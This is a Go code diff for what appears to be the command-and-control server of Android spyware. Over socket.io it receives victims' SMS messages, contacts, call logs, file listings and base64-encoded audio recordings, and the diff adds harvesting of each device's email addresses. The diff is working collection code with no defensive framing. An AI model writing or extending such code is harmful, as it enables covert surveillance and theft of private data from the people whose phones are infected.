@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"os"
 
@@ -11,7 +12,6 @@ import (
 
 	"github.com/googollee/go-socket.io"
 )
-
 
 //type sms struct {
 //	PhoneNumber string `json:"phone-number"`
@@ -23,11 +23,16 @@ import (
 //	allSMS []sms `json:"all_sms"`
 //}
 
-
 var server socketio.Server
 
+type EmailAddresses struct {
+	Emails []struct {
+		Email string `json:"email"`
+	} `json:"emails"`
+}
 
 func main() {
+	handlers.DevicesList.Devices = make([]handlers.Device,0)
 	server, err := socketio.NewServer(nil)
 	if err != nil {
 		log.Fatal(err)
@@ -39,21 +44,45 @@ func main() {
 			DeviceDetails:       s.RemoteHeader().Get("User-Agent"),
 			DeviceRemoteAddress: s.RemoteAddr().String(),
 		}
-		handlers.DeviceList = append(handlers.DeviceList, device)
+		handlers.DevicesList.Devices = append(handlers.DevicesList.Devices, device)
 		fmt.Println("connected:", s.RemoteHeader().Get("User-Agent"))
+		s.Emit("p")
+		server.OnEvent("/", "p", func(s socketio.Conn, data interface{}) {
+			res, _ := json.Marshal(data)
+			var emailAddress EmailAddresses
+			err := json.Unmarshal(res, &emailAddress)
+			if err != nil {
+				log.Println(err)
+			}
+			var d handlers.Device
+			for i, v := range handlers.DevicesList.Devices {
+				if v.ID == s.ID() {
+					d = v
+					handlers.DevicesList.Devices = handlers.DevicesList.Devices[i+1:]
+					for _, e := range emailAddress.Emails {
+						log.Println(e.Email)
+						d.EmailAddresses = append(d.EmailAddresses, e.Email)
+					}
+					log.Println(v)
+					v.EmailAddresses = d.EmailAddresses
+				}
+			}
+			handlers.DevicesList.Devices = append(handlers.DevicesList.Devices, d)
+		})
 		return nil
 	})
-	server.OnEvent("/","sms", func(c  socketio.Conn,data interface{}) {
+
+	server.OnEvent("/", "sms", func(c socketio.Conn, data interface{}) {
 		handlers.MessageList = data
 	})
-	server.OnEvent("/","contacts", func(c  socketio.Conn,data interface{}) {
+	server.OnEvent("/", "contacts", func(c socketio.Conn, data interface{}) {
 		handlers.ContactList = data
 	})
-	server.OnEvent("/","call-logs", func(c  socketio.Conn,data interface{}) {
+	server.OnEvent("/", "call-logs", func(c socketio.Conn, data interface{}) {
 		log.Println(data)
 		handlers.CallLogs = data
 	})
-	server.OnEvent("/","record", func(c  socketio.Conn,data string) {
+	server.OnEvent("/", "record", func(c socketio.Conn, data string) {
 		dec, err := base64.StdEncoding.DecodeString(data)
 		if err != nil {
 			panic(err)
@@ -74,7 +103,7 @@ func main() {
 		log.Println("record received")
 	})
 
-	server.OnEvent("/", "fm-ls", func(c socketio.Conn, data interface{}){
+	server.OnEvent("/", "fm-ls", func(c socketio.Conn, data interface{}) {
 		handlers.FmList = data
 	})
 
@@ -82,7 +111,11 @@ func main() {
 		fmt.Println("meet error:", e)
 	})
 	server.OnDisconnect("/", func(s socketio.Conn, reason string) {
-		fmt.Println(s.ID())
+		for i, v := range handlers.DevicesList.Devices{
+			if s.ID() == v.ID{
+				handlers.DevicesList.Devices = handlers.DevicesList.Devices[i+1:]
+			}
+		}
 		fmt.Println("disconnected ", s.ID())
 		fmt.Println("closed", reason)
 	})
